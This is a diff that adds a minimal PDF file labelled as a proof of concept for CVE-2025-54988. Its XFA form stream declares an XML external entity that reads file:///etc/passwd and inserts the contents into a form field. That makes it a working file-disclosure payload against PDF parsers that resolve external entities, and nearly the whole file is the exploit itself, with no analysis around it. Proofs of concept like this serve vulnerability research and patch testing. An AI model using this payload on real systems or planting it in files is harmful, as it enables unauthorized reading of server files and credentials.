@@ -1,0 +1,54 @@
+%PDF-1.7
+% PoC for CVE-2025-54988 (with Page Tree)
+
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /AcroForm 3 0 R >>
+endobj
+
+2 0 obj
+<< /Type /Pages /Kids [4 0 R] /Count 1 >>
+endobj
+
+3 0 obj
+<< /XFA 5 0 R >>
+endobj
+
+4 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] >>
+endobj
+
+5 0 obj
+<< /Length 295 >>
+stream
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE xfa [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <template>
+    <subform>
+      <field>
+        <value>
+          <text>&xxe;</text>
+        </value>
+      </field>
+    </subform>
+  </template>
+</xdp:xdp>
+endstream
+endobj
+
+xref
+0 6
+0000000000 65535 f 
+0000000018 00000 n 
+0000000088 00000 n 
+0000000150 00000 n 
+0000000189 00000 n 
+0000000266 00000 n 
+
+trailer
+<< /Size 6 /Root 1 0 R >>
+startxref
+590
+%%EOF
